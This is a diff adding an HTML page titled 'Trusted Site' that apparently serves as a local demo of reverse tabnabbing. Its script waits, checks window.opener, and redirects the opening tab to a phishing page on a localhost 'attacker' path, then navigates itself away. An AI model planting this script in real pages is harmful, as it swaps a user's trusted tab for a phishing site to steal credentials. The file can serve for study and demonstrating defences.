@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trusted Site</title>
+    <script>
+        setTimeout(() => {
+            console.log('Window.opener:', window.opener);
+            if (window.opener) {
+                window.opener.location = 'http://127.0.0.1:5500/attacker/phishingsite.html';
+                setTimeout(() => {
+                    window.location.href = 'http://127.0.0.1:5500/attacker/anotherpage.html';
+                }, 2000);
+            } else {
+                console.log('Window.opener is null');
+            }
+        }, 5000);
+        
+
+        
+        
+    </script>
+</head>
+<body>
+    <h1>Trusted Site</h1>
+    <h2>With some interesting content</h2>
+</body>
+</html>
